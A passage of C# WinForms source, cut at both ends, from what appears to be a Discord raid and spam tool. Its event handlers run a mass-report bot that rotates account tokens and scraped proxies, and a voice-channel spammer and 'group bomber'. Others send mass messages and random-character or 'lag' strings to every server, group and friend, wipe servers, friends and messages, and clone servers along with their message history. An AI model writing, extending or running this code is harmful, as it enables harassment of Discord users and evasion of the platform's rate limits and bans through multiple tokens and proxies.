    {
        if (openFileDialog2.ShowDialog() == DialogResult.OK)
        {
            metroTextBox89.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
        }
    }
    private void metroButton151_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (string line in metroTextBox89.Lines)
            {
                if (!(line.Replace(" ", "").Replace(Constants.vbTab, "") == ""))
                {
                    discordClient.SendFriendRequest(ulong.Parse(line));
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton153_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton153.Enabled = false;
            serverVocalSpammer = new Thread(new ThreadStart(doServerVocalSpammer));
            serverVocalSpammer.Start();
            metroButton152.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton152_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton152.Enabled = false;
            serverVocalSpammer.Abort();
            metroButton153.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton154_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketVoiceChannel voiceChannel in theSocketClient.GetGuild(ulong.Parse(metroTextBox92.Text)).VoiceChannels)
            {
                try
                {
                    voiceChannel.ConnectAsync();
                }
                catch (Exception)
                {
                }
                Thread.Sleep((int)numericUpDown22.Value);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton16_CheckedChanged(object sender, EventArgs e)
    {
        numericUpDown6.Enabled = metroRadioButton16.Checked;
    }
    private void metroRadioButton37_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox96.Enabled = !metroRadioButton37.Checked;
        metroButton155.Enabled = !metroRadioButton37.Checked;
    }
    private void metroButton155_Click(object sender, EventArgs e)
    {
        if (openFileDialog2.ShowDialog() == DialogResult.OK)
        {
            metroTextBox96.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
        }
    }
    private void metroButton158_Click(object sender, EventArgs e)
    {
        if (openFileDialog2.ShowDialog() == DialogResult.OK)
        {
            metroTextBox97.Text = System.IO.File.ReadAllText(openFileDialog2.FileName);
        }
    }
    private void metroButton157_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton157.Enabled = false;
            massReportBot = new Thread(new ThreadStart(doMassReportBot));
            massReportBot.Start();
            metroButton156.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton156_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton156.Enabled = false;
            massReportBot.Abort();
            metroButton157.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doMassReportBot()
    {
        TextBox tokens = new TextBox();
        tokens.Text = "";
        TextBox proxies = new TextBox();
        proxies.Text = "";
        System.Net.WebClient webClient = new System.Net.WebClient();
        if (metroRadioButton38.Checked)
        {
            tokens.Text = metroTextBox96.Text;
        }
        if (metroCheckBox82.Checked)
        {
            proxies.Text = metroTextBox97.Text;
        }
        else if (metroCheckBox83.Checked)
        {
            proxies.Text = webClient.DownloadString("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes");
        }
        try
        {
            if (metroCheckBox87.Checked)
            {
                while (true)
                {
                    string theToken = discordClient.Token;
                    string theProxy = "";
                    string theIp = "";
                    string thePort = "";
                    if (metroRadioButton38.Checked)
                    {
                        theToken = tokens.Lines[Utils.GetRandomNumber(0, tokens.Lines.Length + 1)];
                    }
                    if (metroRadioButton38.Checked)
                    {
                        foreach (string line in tokens.Lines)
                        {
                            if (!metroCheckBox86.Checked)
                            {
                                theProxy = proxies.Lines[Utils.GetRandomNumber(0, proxies.Lines.Length + 1)];
                                string[] splitter = Strings.Split(theProxy, ":");
                                theIp = splitter[0];
                                thePort = splitter[1];
                            }
                            Utils.SendReport(line, metroTextBox94.Text, metroTextBox95.Text, metroTextBox93.Text, metroComboBox8.SelectedIndex.ToString(), theIp, thePort);
                            if (metroCheckBox89.Checked)
                            {
                                Thread.Sleep((int)numericUpDown24.Value);
                            }
                        }
                    }
                    else
                    {
                        if (!metroCheckBox86.Checked)
                        {
                            theProxy = proxies.Lines[Utils.GetRandomNumber(0, proxies.Lines.Length + 1)];
                            string[] splitter = Strings.Split(theProxy, ":");
                            theIp = splitter[0];
                            thePort = splitter[1];
                        }
                        Utils.SendReport(theToken, metroTextBox94.Text, metroTextBox95.Text, metroTextBox93.Text, metroComboBox8.SelectedIndex.ToString(), theIp, thePort);
                    }
                }
            }
            else
            {
                string theToken = discordClient.Token;
                string theProxy = "";
                string theIp = "";
                string thePort = "";
                if (metroRadioButton38.Checked)
                {
                    theToken = tokens.Lines[Utils.GetRandomNumber(0, tokens.Lines.Length + 1)];
                }
                if (metroRadioButton38.Checked)
                {
                    foreach (string line in tokens.Lines)
                    {
                        if (!metroCheckBox86.Checked)
                        {
                            theProxy = proxies.Lines[Utils.GetRandomNumber(0, proxies.Lines.Length + 1)];
                            string[] splitter = Strings.Split(theProxy, ":");
                            theIp = splitter[0];
                            thePort = splitter[1];
                        }
                        for (int i = 0; i < numericUpDown23.Value - 1; i++)
                        {
                            Utils.SendReport(line, metroTextBox94.Text, metroTextBox95.Text, metroTextBox93.Text, metroComboBox8.SelectedIndex.ToString(), theIp, thePort);
                            if (metroCheckBox89.Checked)
                            {
                                Thread.Sleep((int)numericUpDown24.Value);
                            }
                        }
                    }
                }
                else
                {
                    if (!metroCheckBox86.Checked)
                    {
                        theProxy = proxies.Lines[Utils.GetRandomNumber(0, proxies.Lines.Length + 1)];
                        string[] splitter = Strings.Split(theProxy, ":");
                        theIp = splitter[0];
                        thePort = splitter[1];
                    }
                    for (int i = 0; i < numericUpDown23.Value - 1; i++)
                    {
                        Utils.SendReport(theToken, metroTextBox94.Text, metroTextBox95.Text, metroTextBox93.Text, metroComboBox8.SelectedIndex.ToString(), theIp, thePort);
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
        metroButton156.Enabled = false;
        metroButton157.Enabled = true;
    }
    private void metroCheckBox82_Click(object sender, EventArgs e)
    {
        metroCheckBox83.Checked = false;
        metroCheckBox86.Checked = false;
        metroButton158.Enabled = true;
        metroTextBox97.Enabled = true;
    }
    private void metroCheckBox83_Click(object sender, EventArgs e)
    {
        metroCheckBox82.Checked = false;
        metroCheckBox86.Checked = false;
        metroButton158.Enabled = false;
        metroTextBox97.Enabled = false;
    }
    private void metroCheckBox86_Click(object sender, EventArgs e)
    {
        metroCheckBox82.Checked = false;
        metroCheckBox83.Checked = false;
        metroButton158.Enabled = false;
        metroTextBox97.Enabled = false;
    }
    private void metroCheckBox87_Click(object sender, EventArgs e)
    {
        metroCheckBox88.Checked = false;
        numericUpDown23.Enabled = false;
    }
    private void metroCheckBox88_Click(object sender, EventArgs e)
    {
        metroCheckBox87.Checked = false;
        numericUpDown23.Enabled = true;
    }
    private void metroCheckBox89_Click(object sender, EventArgs e)
    {
        metroCheckBox90.Checked = false;
        numericUpDown24.Enabled = true;
    }
    private void metroCheckBox90_Click(object sender, EventArgs e)
    {
        metroCheckBox89.Checked = false;
        numericUpDown24.Enabled = false;
    }
    private void metroButton161_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doGroupCleaner));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doGroupCleaner()
    {
        try
        {
            foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
            {
                try
                {
                    socketGroupChannel.LeaveAsync();
                }
                catch (Exception ex)
                {
                }
                try
                {
                    Discord.REQ.Group.CloseDMChannel(socketGroupChannel.Id.ToString(), discordClient.Token);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton162_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doServerCleaner));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doServerCleaner()
    {
        try
        {
            foreach (SocketGuild socketGuild in theSocketClient.Guilds)
            {
                try
                {
                    socketGuild.DeleteAsync();
                }
                catch (Exception ex)
                {
                }
                try
                {
                    socketGuild.LeaveAsync();
                }
                catch (Exception ex)
                {
                }
                try
                {
                    Discord.REQ.Guild.Leave(socketGuild.Id.ToString(), discordClient.Token);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
        try
        {
            foreach (PartialGuild discordGuild in discordClient.GetGuilds())
            {
                try
                {
                    discordGuild.Leave();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton164_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doRelationshipCleaner));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doRelationshipCleaner()
    {
        try
        {
            foreach (Relationship relationship in discordClient.GetRelationships())
            {
                try
                {
                    relationship.Remove();
                }
                catch (Exception ex)
                {
                }
                try
                {
                    Discord.REQ.RelationShip.RemoveFriend(relationship.User.Id.ToString(), discordClient.Token);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton163_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doConversationCleaner));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doConversationCleaner()
    {
        try
        {
            foreach (Relationship relationship in discordClient.GetRelationships())
            {
                try
                {
                    foreach (DiscordMessage discordMessage in discordClient.GetChannel(ulong.Parse(Utils.GetChannelIDByFriendID(discordClient.Token, relationship.User.Id.ToString()))).ToTextChannel().GetMessages())
                    {
                        try
                        {
                            discordMessage.Delete();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroComboBox9_SelectedIndexChanged(object sender, EventArgs e)
    {
        metroComboBox10.Items.Clear();
        if (metroComboBox9.SelectedIndex == 0)
        {
            metroComboBox10.Items.Add("Specific channel");
            metroComboBox10.Items.Add("Specific channels");
        }
        else if (metroComboBox9.SelectedIndex == 1)
        {
            metroComboBox10.Items.Add("Specific friend");
            metroComboBox10.Items.Add("Specific friends");
            metroComboBox10.Items.Add("All friends");
            metroComboBox10.Items.Add("All friends except...");
        }
        else if (metroComboBox9.SelectedIndex == 2)
        {
            metroComboBox10.Items.Add("Specific channel");
            metroComboBox10.Items.Add("All channels");
            metroComboBox10.Items.Add("All channels except...");
        }
        else if (metroComboBox9.SelectedIndex == 3)
        {
            metroComboBox10.Items.Add("Specific group");
            metroComboBox10.Items.Add("All groups");
            metroComboBox10.Items.Add("All groups except...");
        }
        metroComboBox10.SelectedIndex = 0;
    }
    private void metroRadioButton41_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox98.Enabled = metroRadioButton41.Checked;
    }
    private void metroButton160_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton160.Enabled = false;
            messageScheduler = new Thread(new ThreadStart(doMessageScheduler));
            messageScheduler.Start();
            metroButton159.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroCheckBox93_Click(object sender, EventArgs e)
    {
        metroCheckBox92.Checked = false;
        numericUpDown27.Enabled = true;
    }
    private void metroCheckBox92_Click(object sender, EventArgs e)
    {
        metroCheckBox93.Checked = false;
        numericUpDown27.Enabled = false;
    }
    private void metroButton165_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doGroupMassMessage));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doGroupMassMessage()
    {
        try
        {
            int theDelay = (int)numericUpDown27.Value;
            if (metroCheckBox92.Checked)
            {
                theDelay = Utils.GetRandomNumber(750, 1250);
            }
            if (metroRadioButton48.Checked)
            {
                foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
                {
                    try
                    {
                        socketGroupChannel.SendMessageAsync(metroTextBox103.Text);
                    }
                    catch (Exception ex)
                    {
                    }
                    Thread.Sleep(theDelay);
                }
            }
            else if (metroRadioButton46.Checked)
            {
                foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
                {
                    try
                    {
                        foreach (string line in metroTextBox105.Lines)
                        {
                            try
                            {
                                if (socketGroupChannel.Id.ToString() == line)
                                {
                                    socketGroupChannel.SendMessageAsync(metroTextBox103.Text);
                                    break;
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                    Thread.Sleep(theDelay);
                }
            }
            else
            {
                foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
                {
                    try
                    {
                        foreach (string line in metroTextBox105.Lines)
                        {
                            try
                            {
                                bool canSend = true;
                                if (socketGroupChannel.Id.ToString() == line)
                                {
                                    canSend = false;
                                }
                                if (canSend)
                                {
                                    socketGroupChannel.SendMessageAsync(metroTextBox103.Text);
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                    Thread.Sleep(theDelay);
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton45_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox104.Enabled = !metroRadioButton45.Checked;
    }
    private void metroButton166_Click(object sender, EventArgs e)
    {
        try
        {
            Thread thread = new Thread(new ThreadStart(doServerMassMessage));
            thread.Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doServerMassMessage()
    {
        try
        {
            string theMessage = metroTextBox106.Text;
            int theDelay = (int)numericUpDown28.Value;
            if (metroCheckBox95.Checked)
            {
                theDelay = Utils.GetRandomNumber(750, 1250);
            }
            if (metroRadioButton51.Checked)
            {
                foreach (SocketGuild socketGuild in theSocketClient.Guilds)
                {
                    try
                    {
                        foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                        {
                            Thread.Sleep(theDelay);
                            try
                            {
                                Discord.Rest.RestUserMessage messagim = socketTextChannel.SendMessageAsync(theMessage).Result;
                                if (messagim != null)
                                {
                                    if (metroCheckBox96.Checked)
                                    {
                                        break;
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            else if (metroRadioButton49.Checked)
            {
                foreach (SocketGuild socketGuild in theSocketClient.Guilds)
                {
                    foreach (string line in metroTextBox107.Lines)
                    {
                        try
                        {
                            if (socketGuild.Id.ToString() == line)
                            {
                                try
                                {
                                    foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                                    {
                                        Thread.Sleep(theDelay);
                                        try
                                        {
                                            Discord.Rest.RestUserMessage messagim = socketTextChannel.SendMessageAsync(theMessage).Result;
                                            if (messagim != null)
                                            {
                                                if (metroCheckBox96.Checked)
                                                {
                                                    break;
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
            else
            {
                foreach (SocketGuild socketGuild in theSocketClient.Guilds)
                {
                    foreach (string line in metroTextBox107.Lines)
                    {
                        try
                        {
                            bool canSend = true;
                            if (socketGuild.Id.ToString() == line)
                            {
                                canSend = false;
                            }
                            if (canSend)
                            {
                                try
                                {
                                    foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                                    {
                                        Thread.Sleep(theDelay);
                                        try
                                        {
                                            Discord.Rest.RestUserMessage messagim = socketTextChannel.SendMessageAsync(theMessage).Result;
                                            if (messagim != null)
                                            {
                                                if (metroCheckBox96.Checked)
                                                {
                                                    break;
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doMessageScheduler()
    {
        while (true)
        {
            Thread.Sleep(150);
            try
            {
                string theThing = metroTextBox101.Text;
                string[] splitter = Strings.Split(theThing, ":");
                string newHourFormat = "";
                string newMinuteFormat = "";
                string newSecondFormat = "";
                if (DateTime.Now.Hour.ToString().Length == 1)
                {
                    newHourFormat = "0" + DateTime.Now.Hour.ToString();
                }
                else
                {
                    newHourFormat = DateTime.Now.Hour.ToString();
                }
                if (DateTime.Now.Minute.ToString().Length == 1)
                {
                    newMinuteFormat = "0" + DateTime.Now.Minute.ToString();
                }
                else
                {
                    newMinuteFormat = DateTime.Now.Minute.ToString();
                }
                if (DateTime.Now.Second.ToString().Length == 1)
                {
                    newSecondFormat = "0" + DateTime.Now.Second.ToString();
                }
                else
                {
                    newSecondFormat = DateTime.Now.Second.ToString();
                }
                if (splitter[0] == newHourFormat && splitter[1] == newMinuteFormat && splitter[2] == newSecondFormat)
                {
                    for (int i = 0; i < (int)numericUpDown25.Value; i++)
                    {
                        Thread.Sleep((int)numericUpDown26.Value);
                        string theMessage = metroTextBox98.Text;
                        if (metroRadioButton39.Checked)
                        {
                            theMessage = Utils.RandomNormalString(1750);
                        }
                        else if (metroRadioButton40.Checked)
                        {
                            theMessage = Utils.RandomChineseString(1750);
                        }
                        else if (metroRadioButton42.Checked)
                        {
                            theMessage = Utils.GetLagString();
                            theMessage = theMessage.Substring(0, theMessage.Length - 300);
                        }
                        if (metroCheckBox91.Checked)
                        {
                            theMessage += " " + Utils.GetRandomNumber(1000, 9999);
                        }
                        if (metroComboBox9.SelectedIndex == 0)
                        {
                            if (metroComboBox10.SelectedIndex == 0)
                            {
                                discordClient.GetChannel(ulong.Parse(metroTextBox100.Text)).ToTextChannel().SendMessage(theMessage);
                            }
                            else
                            {
                                foreach (string line in metroTextBox99.Lines)
                                {
                                    try
                                    {
                                        discordClient.GetChannel(ulong.Parse(line)).ToTextChannel().SendMessage(theMessage);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                        }
                        else if (metroComboBox9.SelectedIndex == 1)
                        {
                            if (metroComboBox10.SelectedIndex == 0)
                            {
                                foreach (Relationship relationship in discordClient.GetRelationships())
                                {
                                    try
                                    {
                                        if (relationship.User.Id.ToString() == metroTextBox100.Text)
                                        {
                                            theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(theMessage);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            else if (metroComboBox10.SelectedIndex == 1)
                            {
                                foreach (Relationship relationship in discordClient.GetRelationships())
                                {
                                    try
                                    {
                                        foreach (string line in metroTextBox99.Lines)
                                        {
                                            if (relationship.User.Id.ToString() == line)
                                            {
                                                theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(theMessage);
                                                break;
                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            else if (metroComboBox10.SelectedIndex == 2)
                            {
                                foreach (Relationship relationship in discordClient.GetRelationships())
                                {
                                    try
                                    {
                                        theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(theMessage);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            else
                            {
                                foreach (Relationship relationship in discordClient.GetRelationships())
                                {
                                    try
                                    {
                                        bool canSend = true;
                                        foreach (string line in metroTextBox99.Lines)
                                        {
                                            if (relationship.User.Id.ToString() == line)
                                            {
                                                canSend = false;
                                                break;
                                            }
                                        }
                                        if (canSend)
                                        {
                                            theSocketClient.GetUser(relationship.User.Id).SendMessageAsync(theMessage);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                        }
                        else if (metroComboBox9.SelectedIndex == 2)
                        {
                            if (metroComboBox10.SelectedIndex == 0)
                            {
                                foreach (SocketGuild socketGuild in theSocketClient.Guilds)
                                {
                                    if (socketGuild.Id.ToString() == metroTextBox100.Text)
                                    {
                                        try
                                        {
                                            foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                                            {
                                                try
                                                {
                                                    if (socketTextChannel.Id.ToString() == metroTextBox102.Text)
                                                    {
                                                        socketTextChannel.SendMessageAsync(theMessage);
                                                    }
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            else if (metroComboBox10.SelectedIndex == 1)
                            {
                                foreach (SocketGuild socketGuild in theSocketClient.Guilds)
                                {
                                    if (socketGuild.Id.ToString() == metroTextBox100.Text)
                                    {
                                        try
                                        {
                                            foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                                            {
                                                try
                                                {
                                                    socketTextChannel.SendMessageAsync(theMessage);
                                                }
                                                catch (Exception ex)
                                                {
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                            else
                            {
                                if (metroComboBox10.SelectedIndex == 0)
                                {
                                    foreach (SocketGuild socketGuild in theSocketClient.Guilds)
                                    {
                                        if (socketGuild.Id.ToString() == metroTextBox100.Text)
                                        {
                                            try
                                            {
                                                foreach (SocketTextChannel socketTextChannel in socketGuild.TextChannels)
                                                {
                                                    try
                                                    {
                                                        bool canSend = true;
                                                        foreach (string line in metroTextBox99.Lines)
                                                        {
                                                            if (socketTextChannel.Id.ToString() == line)
                                                            {
                                                                canSend = false;
                                                                break;
                                                            }
                                                        }
                                                        if (canSend)
                                                        {
                                                            socketTextChannel.SendMessageAsync(theMessage);
                                                        }
                                                    }
                                                    catch (Exception ex)
                                                    {
                                                    }
                                                }
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            if (metroComboBox10.SelectedIndex == 0)
                            {
                                foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
                                {
                                    try
                                    {
                                        if (socketGroupChannel.Id.ToString() == metroTextBox100.Text)
                                        {
                                            socketGroupChannel.SendMessageAsync(theMessage);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            else if (metroComboBox10.SelectedIndex == 1)
                            {
                                foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
                                {
                                    try
                                    {
                                        socketGroupChannel.SendMessageAsync(theMessage);
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                            else
                            {
                                foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
                                {
                                    try
                                    {

                                        bool canSend = true;
                                        foreach (string line in metroTextBox99.Lines)
                                        {
                                            if (socketGroupChannel.Id.ToString() == line)
                                            {
                                                canSend = false;
                                                break;
                                            }
                                        }
                                        if (canSend)
                                        {
                                            socketGroupChannel.SendMessageAsync(theMessage);
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
    private void metroCheckBox96_Click(object sender, EventArgs e)
    {
        metroCheckBox97.Checked = false;
    }
    private void metroCheckBox97_Click(object sender, EventArgs e)
    {
        metroCheckBox96.Checked = false;
    }
    private void metroCheckBox94_Click(object sender, EventArgs e)
    {
        metroCheckBox95.Checked = false;
        numericUpDown28.Enabled = true;
    }
    private void metroCheckBox95_Click(object sender, EventArgs e)
    {
        metroCheckBox94.Checked = false;
        numericUpDown28.Enabled = false;
    }
    private void metroButton142_Click(object sender, EventArgs e)
    {
        try
        {
            Utils.BanUser(discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton168_Click(object sender, EventArgs e)
    {
        try
        {
            List<ulong> users = new List<ulong>();
            foreach (string line in metroTextBox109.Lines)
            {
                try
                {
                    users.Add(ulong.Parse(line));
                }
                catch (Exception ex)
                {
                }
            }
            DiscordGroup discordGroup = discordClient.CreateGroup(users);
            if (metroCheckBox98.Checked)
            {
                Discord.REQ.Group.Rename(discordGroup.Id.ToString(), metroTextBox110.Text, discordClient.Token);
            }
            if (metroCheckBox99.Checked)
            {
                discordGroup.Leave();
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton54_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox111.Enabled = metroRadioButton54.Checked;
    }
    private void metroButton169_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton169.Enabled = false;
            groupBomber = new Thread(new ThreadStart(doGroupBomber));
            groupBomber.Start();
            metroButton167.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton167_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton167.Enabled = false;
            groupBomber.Abort();
            metroButton169.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton170_Click(object sender, EventArgs e)
    {
        if (saveFileDialog2.ShowDialog() == DialogResult.OK)
        {
            metroTextBox117.Text = saveFileDialog2.FileName;
        }
    }
    private void metroTextBox1_TextChanged(object sender, EventArgs e)
    {
        Settings.Default.SavedToken = metroTextBox1.Text;
        Settings.Default.Save();
    }
    private void metroRadioButton1_CheckedChanged(object sender, EventArgs e)
    {
        Settings.Default.IsBot = false;
        Settings.Default.Save();
    }
    private void metroRadioButton2_CheckedChanged(object sender, EventArgs e)
    {
        Settings.Default.IsBot = true;
        Settings.Default.Save();
    }
    private void metroButton83_Click(object sender, EventArgs e)
    {
        try
        {
            DiscordGuild discordGuild = discordClient.GetGuild(ulong.Parse(metroTextBox63.Text));
            SocketGuild socketGuild = theSocketClient.GetGuild(ulong.Parse(metroTextBox63.Text));
            DiscordGuild newGuild;
            string theName = "New server";
            DiscordImage icon = null;
            string serverRegion = null;
            if (metroCheckBox111.Checked)
            {
                theName = discordGuild.Name;
            }
            if (metroCheckBox112.Checked)
            {
                icon = discordGuild.Icon.Download(DiscordCDNImageFormat.PNG);
            }
            if (metroCheckBox113.Checked)
            {
                serverRegion = discordGuild.Region;
            }
            newGuild = discordClient.CreateGuild(theName, icon, serverRegion);
            SocketGuild newSocketGuild = theSocketClient.GetGuild(newGuild.Id);
            foreach (DiscordChannel discordChannel1 in newGuild.GetChannels())
            {
                try
                {
                    discordChannel1.Delete();
                }
                catch (Exception ex)
                {
                }
            }
            if (metroCheckBox119.Checked)
            {
                foreach (SocketRole socketRole in socketGuild.Roles)
                {
                    try
                    {
                        newSocketGuild.CreateRoleAsync(socketRole.Name, socketRole.Permissions, socketRole.Color, socketRole.IsHoisted);
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            foreach (DiscordChannel discordChannel in discordGuild.GetChannels())
            {
                try
                {
                    if ((metroCheckBox108.Checked && discordChannel.Type == 0) || (metroCheckBox109.Checked && (int)discordChannel.Type == 2) || (metroCheckBox110.Checked && (int)discordChannel.Type == 4) || (metroCheckBox104.Checked && (int)discordChannel.Type == 5))
                    {
                        try
                        {
                            GuildChannel guildChannel = newGuild.CreateChannel(discordChannel.Name, discordChannel.Type);
                            if (metroCheckBox117.Checked)
                            {
                                if (discordChannel.Type == 0)
                                {
                                    foreach (SocketTextChannel socketTextChannel in newSocketGuild.TextChannels)
                                    {
                                        if (socketTextChannel.Id == guildChannel.Id)
                                        {
                                            try
                                            {
                                                socketTextChannel.ModifyAsync(x =>
                                                {
                                                    x.Topic = discordChannel.ToTextChannel().Topic;
                                                });
                                            }
                                            catch (Exception ex)
                                            {
                                            }
                                            break;
                                        }
                                    }
                                }
                            }
                            if (metroCheckBox118.Checked)
                            {
                                if (discordChannel.Type == 0)
                                {
                                    foreach (string line in metroTextBox119.Lines)
                                    {
                                        try
                                        {
                                            if (discordChannel.Id.ToString() == line)
                                            {
                                                List<DiscordMessage> listona = (List<DiscordMessage>)discordChannel.ToTextChannel().GetMessages();
                                                listona.Reverse();
                                                foreach (DiscordMessage discordMessage in listona)
                                                {
                                                    try
                                                    {
                                                        guildChannel.ToTextChannel().SendMessage(discordMessage.Content, discordMessage.Tts, discordMessage.Embed);
                                                    }
                                                    catch (Exception ex)
                                                    {
                                                    }
                                                }
                                                break;
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton172_Click(object sender, EventArgs e)
    {
        try
        {
            try
            {
                int i = 0;
                foreach (SocketTextChannel socketTextChannel in getIndexedGuild(metroComboBox4.SelectedIndex).TextChannels)
                {
                    if (i == metroComboBox5.SelectedIndex)
                    {
                        Clipboard.SetText(socketTextChannel.Name);
                    }
                    i++;
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton173_Click(object sender, EventArgs e)
    {
        try
        {
            try
            {
                try
                {
                    int i = 0;
                    foreach (SocketVoiceChannel socketVoiceChannel in getIndexedGuild(metroComboBox4.SelectedIndex).VoiceChannels)
                    {
                        if (i == metroComboBox6.SelectedIndex)
                        {
                            Clipboard.SetText(socketVoiceChannel.Name);
                        }
                        i++;
                    }
                }
                catch (Exception ex)
                {
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton174_Click(object sender, EventArgs e)
    {
        try
        {
            Clipboard.SetText(getIndexedGuild(metroComboBox4.SelectedIndex).Name);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton175_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
            {
                if (socketGroupChannel.Id.ToString() == metroTextBox64.Text)
                {
                    List<ulong> users = new List<ulong>();
                    foreach (SocketGroupUser socketGroupUser in socketGroupChannel.Users)
                    {
                        users.Add(socketGroupUser.Id);
                    }
                    DiscordGroup discordGroup = discordClient.CreateGroup(users);
                    if (metroCheckBox114.Checked)
                    {
                        Discord.REQ.Group.Rename(discordGroup.Id.ToString(), socketGroupChannel.Name, discordClient.Token);
                    }
                    if (metroCheckBox115.Checked)
                    {
                        discordGroup.Leave();
                    }
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton176_Click(object sender, EventArgs e)
